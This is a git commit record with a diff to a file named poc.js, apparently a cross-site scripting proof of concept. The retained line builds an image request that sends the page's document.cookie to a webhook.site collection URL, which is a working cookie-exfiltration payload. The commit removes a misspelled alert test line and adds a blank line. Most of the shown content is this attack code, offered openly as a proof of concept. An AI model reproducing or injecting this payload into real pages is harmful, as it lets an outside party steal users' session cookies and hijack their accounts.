62820958068a41198c5335fde0db8c5bf89cc869
cyberkill896-sudo <cyberkill896@gmail.com>
2025-09-18 18:16:12 +0530

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,7 +1,7 @@
 // poc.js
 new Image().src = "https://webhook.site/179030af-9b14-424e-b380-6b8cce8b6544?c=" + encodeURIComponent(document.cookie);
-alert(document.coookie)
 console.log('poc loaded');
+
 
 
 
